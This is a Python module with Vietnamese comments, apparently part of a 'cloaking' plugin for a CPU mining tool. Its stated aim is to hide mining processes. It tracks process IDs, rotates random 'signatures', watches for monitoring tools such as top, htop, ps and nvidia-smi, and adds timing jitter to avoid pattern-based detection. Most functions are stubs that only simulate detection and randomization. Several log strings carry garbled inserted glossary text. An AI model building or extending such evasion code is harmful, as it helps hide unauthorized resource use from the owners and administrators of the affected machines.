"""cpu_plugins.cloaking.signature_randomizer

Module này cung cấp chức năng ngẫu nhiên hóa chữ ký, giúp che dấu hoạt động khai thác.
"""

import random
import logging
import threading
import time
from typing import List, Optional, Dict, Any, Callable


class SignatureRandomizer:
    """
    Lớp thực hiện ngẫu nhiên hóa chữ ký để che dấu các tiến trình khai thác.
    """

    def __init__(self, logger: Optional[logging.Logger] = None):
        """Khởi tạo SignatureRandomizer.

        Args:
            logger: Logger tùy chọn. Nếu None, sẽ tạo logger mới.
        """
        self.logger = logger or logging.getLogger(__name__)
        self._running = False
        self._thread = None
        self._registered_pids = set()
        self._detection_callbacks: List[Callable] = []
        self._randomization_interval = 300  # 5 phút mặc định
        # Thêm chữ ký hiện tại để có thể truy xuất ở nơi khác
        self._current_signature: Optional[str] = None
        # Mutex để đảm bảo thread-safety cho các thao tác cập nhật chữ ký
        self._lock = threading.Lock()

    def start(self, interval: int = 300) -> bool:
        """Bắt đầu quá trình ngẫu nhiên hóa chữ ký.

        Args:
            interval: Khoảng thời gian giữa các lần ngẫu nhiên hóa (giây).

        Returns:
            bool: True nếu bắt đầu thành công, False nếu đã chạy.
        """
        if self._running:
            return False

        self._randomization_interval = interval
        self._running = True
        self._thread = threading.Thread(target=self._randomize_loop, daemon=True)
        self._thread.start()
        self.logger.info(f"Signature randomizer started with interval {interval}s")
        return True

    def stop(self) -> None:
        """Dừng quá trình ngẫu nhiên hóa chữ ký."""
        self._running = False
        if self._thread and self._thread.is_alive():
            try:
                self._thread.join(timeout=1.0)
            except Exception as e:
                self.logger.warning(f"Exception when stopping signature randomizer: {e}")

    def register_pid(self, pid: int) -> None:
        """Đăng ký một PID để theo dõi và ngẫu nhiên hóa.

        Args:
            pid: Process ID cần theo dõi.
        """
        self._registered_pids.add(pid)
        self.logger.debug(f"Registered **[PID]** (Process ID - mã định danh tiến trình) {pid} for signature randomization")

    def unregister_pid(self, pid: int) -> None:
        """Hủy đăng ký một PID.

        Args:
            pid: Process ID cần hủy đăng ký.
        """
        if pid in self._registered_pids:
            self._registered_pids.remove(pid)
            self.logger.debug(f"Unregistered **[PID]** (Process ID - mã định danh tiến trình) {pid} from signature randomization")

    def register_detection_callback(self, callback: Callable) -> None:
        """Đăng ký callback được gọi khi phát hiện giám sát.

        Args:
            callback: Hàm callback khi phát hiện, signature: callback()
        """
        self._detection_callbacks.append(callback)

    def detect_monitoring_tools(self) -> Dict[str, Any]:
        """Phát hiện công cụ giám sát đang chạy.

        Returns:
            Dict chứa thông tin về các công cụ giám sát được phát hiện.
        """
        # Mô phỏng việc phát hiện công cụ giám sát
        monitoring_tools = {
            'found': False,
            'threat_level': 'LOW',
            'tools': []
        }
        
        # Các công cụ phổ biến (chỉ mô phỏng logic phát hiện)
        common_tools = ['top', 'htop', 'ps', 'nvidia-smi']
        
        try:
            # Trong thực tế, hàm này sẽ quét để tìm công cụ giám sát
            # Hiện tại chỉ mô phỏng với tỉ lệ phát hiện thấp
            if random.random() < 0.05:  # 5% cơ hội phát hiện để mô phỏng
                monitoring_tools['found'] = True
                monitoring_tools['threat_level'] = random.choice(['LOW', 'MEDIUM', 'HIGH'])
                monitoring_tools['tools'] = [random.choice(common_tools)]
                
                # Kích hoạt callbacks
                for callback in self._detection_callbacks:
                    try:
                        callback()
                    except Exception as e:
                        self.logger.error(f"**[error]** (lỗi) in detection callback: {e}")
                
        except Exception as e:
            self.logger.error(f"**[error]** (lỗi) detecting monitoring tools: {e}")
        
        return monitoring_tools

    def _randomize_loop(self) -> None:
        """Vòng lặp chính cho quá trình ngẫu nhiên hóa."""
        while self._running:
            try:
                self._randomize_signatures()
                # Kiểm tra công cụ giám sát
                self.detect_monitoring_tools()
                
                # Ngủ với jitter để tránh phát hiện dựa trên mẫu thời gian
                jitter = random.uniform(0.8, 1.2)  # ±20% jitter
                sleep_time = self._randomization_interval * jitter
                
                # Ngủ theo từng phần nhỏ để có thể thoát nhanh hơn khi cần dừng
                chunks = 10
                for _ in range(chunks):
                    if not self._running:
                        break
                    time.sleep(sleep_time / chunks)
                    
            except Exception as e:
                self.logger.error(f"**[error]** (lỗi) in signature randomization loop: {e}")
                time.sleep(30)  # Ngủ ngắn hơn nếu có lỗi

    def _randomize_signatures(self) -> None:
        """Thực hiện ngẫu nhiên hóa chữ ký cho các tiến trình đã đăng ký."""
        if not self._registered_pids:
            return
        with self._lock:
            # Tạo chữ ký mới và lưu lại
            self._current_signature = self._create_random_signature()
        for pid in list(self._registered_pids):
            try:
                # Giả lập việc ngẫu nhiên hóa chữ ký cho pid
                self.logger.debug(f"Randomizing signature for **[PID]** (Process ID - mã định danh tiến trình) {pid} -> signature {self._current_signature}")
                # Trong triển khai thực tế, sẽ có các tác vụ ngẫu nhiên hóa thực sự
            except Exception as e:
                self.logger.warning(f"**[error]** (lỗi) randomizing signature for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
                # Xóa PID không hợp lệ
                self._registered_pids.discard(pid)

    def _create_random_signature(self, length: int = 16) -> str:
        """Tạo chuỗi hex ngẫu nhiên dùng làm chữ ký."""
        return ''.join(random.choices('0123456789abcdef', k=length))

    def _reset_signature(self):
        """Đặt _current_signature về None khi hết hạn."""
        with self._lock:
            self._current_signature = None

    def apply_signature_randomization(self) -> None:
        """Gọi ngẫu nhiên hóa chữ ký ngay lập tức.

        Hàm wrapper để tương thích với CPUResourceManager.
        """
        self._randomize_signatures()

    def generate_dynamic_signature(self, duration: int = 60) -> str:
        """Tạo và trả về một chữ ký động trong ``duration`` giây.

        Args:
            duration: Khoảng thời gian chữ ký có hiệu lực (giây).

        Returns:
            str: Giá trị chữ ký mới.
        """
        with self._lock:
            self._current_signature = self._create_random_signature()
        # Lên lịch reset sau ``duration`` giây ở nền để tránh block
        threading.Timer(duration, self._reset_signature).start()
        self.logger.debug(f"Generated dynamic signature valid for {duration}s: {self._current_signature}")
        return self._current_signature or ""

    def get_current_patterns(self) -> List[str]:
        """Trả về danh sách (một phần tử) chữ ký hiện tại."""
        return [self._current_signature] if self._current_signature else [] 